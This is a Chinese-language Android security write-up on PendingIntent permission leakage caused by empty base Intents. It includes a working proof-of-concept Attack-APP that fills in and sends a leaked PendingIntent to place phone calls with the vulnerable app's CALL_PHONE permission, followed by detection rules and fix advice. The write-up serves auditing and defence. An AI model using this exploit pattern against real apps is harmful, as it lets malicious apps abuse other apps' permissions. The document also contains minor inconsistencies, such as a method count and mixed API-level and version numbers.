## 风险描述
简述：会造成权限泄露，恶意应用会拿到风险应用的全部权限，并根据具体的权限做出不同的权限利用动作。

## 攻击手法
### 预备
1. 两个应用，分别称为：Bug-APP、Attack-APP。
2. 应用运行系统：Android 4.0.1(14)——Android 4.4.4(20)。
3. 说明：我们直接使用Attack-App来处理Bug-app发送的数据,这不是正常的风险发生模型。正常的是：_Bug-APP_发送数据不小心 + Attack-app 认真的辨别而后接收到了Bug-App发送的数据 = 损失发生。
4. 第3点涉及到了我们的：风险防范手段 / 风险防范层面 / 风险防范角度。
### 编码
Bug-APP 核心代码:
1. AndroidManifest.xml
```xml
<uses-permission android:name="android.permission.CALL_PHONE" />
```
2. java代码
```java
@Override
public void onClick(View view) {
    Intent intent;
    PendingIntent pendingIntent;
    switch (view.getId()) {

        case R.id.btn_pi_1://发送之后Attack-APP不做处理直接启动
            intent = new Intent("action_2");
            pendingIntent = PendingIntent.getActivity(this, 1, new Intent(Intent.ACTION_CALL, Uri.parse("tel:10010")), 0);
            intent.putExtra("pendingIntent_extra", pendingIntent);
            startActivity(intent);
            break;
            
        case R.id.btn_pi_2://发送之后靶机，根据权限做出精心准备
            intent = new Intent("action_2");
            pendingIntent = PendingIntent.getActivity(this, 1, new Intent(), 0);
            intent.putExtra("pendingIntent_non", pendingIntent);
            startActivity(intent);
            break;
    }
}
```

Attack-APP 核心编码
1. AndroidManifest.xml文件中没有任何权限声明
2. Java代码
```java
@Override
public void onClick(View view) {
    Intent intent = getIntent();
    switch (view.getId()) {

        case R.id.btn_action_2://直接启用PendingIntent中的Intent
            PendingIntent pendingIntent = intent.getParcelableExtra("pendingIntent_extra");
            pendingIntent.send();
            break;

        case R.id.btn_action_2_cando://先把PendingIntent中的Intent做修改再启用该Intent
            try {
                PendingIntent pendingIntent = intent.getParcelableExtra("pendingIntent_non");
                pendingIntent.send(this, 0, new Intent(Intent.ACTION_CALL, Uri.parse("tel:10010")));
            } catch (PendingIntent.CanceledException e) {
                e.printStackTrace();
            }
            break;
    }
}
```

### 开始

说明两个click响应，根据putExtra中的key来区分Click
- __pendingIntent_extra__:
    - But-app通过本区域代码启动Attack-app。
    - Attack-app通过本区域代码验证了Bug-App的权限可以公国Attack-app来使用。(原理上还是But-app使用了自己的权限，但是效果上就是Attack-app代为使用了该权限。)
- __pendingIntent_non__:
    - But-app通过本区域代码启动Attack-app。
    - Attack-app通过本区域代码验证了Bug-app的权限可以被传递到Attack-app，并且Attack-app可以根据Bug-app的权限范围做任何操作。__提权__

## 査漏手法
1. 首先我们需要判定漏洞影响范围
    - 通过真机和模拟器的测试知道了该风险影响到的android系统为:` >= Android15`
2. 其次我们应该确认漏洞涉及的关键代码
    - 已经知道了 new Intent() 会造成风险。
    - 接下来确认限制是否在Intent.fillIn上。从而可以判断是否可以绕过,没有源码的联通逻辑这个校验很难啊。
    - 可以提供空Intent的生成为风险
3. 最后确定检查手段。
    - 这个检测有几个层面
        1. 创建的时候空Intent
        2. 是否把空Intent传送给三方应用。

关于下述方法https://developer.android.google.cn/reference/android/app/PendingIntent.html
1. PendingIntent.getActivities(Context context, int requestCode, Intent[] intents, int flags, Bundle options)
2. PendingIntent.getActivities(Context context, int requestCode, Intent[] intents, int flags) 
3. PendingIntent.getActivity(Context context, int requestCode, Intent intent, int flags) 
4. PendingIntent.getActivity(Context context, int requestCode, Intent intent, int flags, Bundle options) 
5. PendingIntent.getBroadcast(Context context, int requestCode, Intent intent, int flags) 
6. PendingIntent.getService(Context context, int requestCode, Intent intent, int flags) 

以上四个方法在调用的时候如果加入参数为 `new Intent()` 直接判定存在风险    

下文风险用代码说明了：
```java
//代码段 -0
Intent intent = new Intent();

//代码段-1
Intent intent = new Intent("action");
//代码段-2
Intent intent = new Intent();
intent.setAction("action");
//代码段-1 和 代码段-2 等价

//代码段 -3
Intent intent = new Intent("com.example.tom.drop", "com.example.tom.drop.ActivityAction_2_2");
//代码段 -4
Intent intent = new Intent();
ComponentName componentName = new ComponentName("com.example.tom.drop", "com.example.tom.drop.ActivityAction_2_2");
intent.setComponent(componentName);
//代码段 -5
Intent intent = new Intent();
intent.setClass(******************
//代码段-3-4-5 等价


//Intent中存在一些常量
public static final int FILL_IN_ACTION = 1<<0;      //0x1
public static final int FILL_IN_COMPONENT = 1<<3;   //0x8
```
Component的优先级高于Action

我们的检测方式：

- 查找PendingIntent.getXXX方法——如果没找到没有风险。
- 找到了。最终参数Intent的初始化过程。
- 如果使用了`代码段0`的初始化方式- __风险__
- 如果使用了`代码段12`的初始化方式，并且`getXXX`方法中的flag设置为`FILL_IN_ACTION`——__风险__
- _如果使用了`代码段345`的初始化方式，并且`getXXX`方法中flat设置为`FILL_IN_COMPONENT`——__风险___

这个风险的细节：风险真正的发生是开发者把这个PendingIntent按照我们认为风险的方式发送给三方应用风险才真正产生。
而我们没有审计开发者是否把风险移交给三方应用所以这个内容在真正审计的时候永远不会是高危漏洞，最多算是风险。



## 修复建议
1. PendingIntent中的Intent参数不要使用  `new Intent()`
2. 如果PendingIntent初始化时候的Intent参数设置了Action没有设置Component，PendingIntent初始化的flag不要使用FILL_IN_ACTION
3. 如果PendingIntent初始化时候的Intent参数设置了Component，PendingIntent初始化的flag不要使用FILL_IN_COMPONENT
4. __重要__ 如果上述不太确定最好不要把PendingIntent交给三方应用。


## 参考
1. http://wps2015.org/drops/drops/安卓Bug%2017356824%20BroadcastAnywhere漏洞分析.html
2. http://blog.csdn.net/wangbaochu/article/details/50599788
3. http://blog.csdn.net/zhaokaiqiang1992/article/details/19613149
4. http://www.cnblogs.com/vendanner/p/5114414.html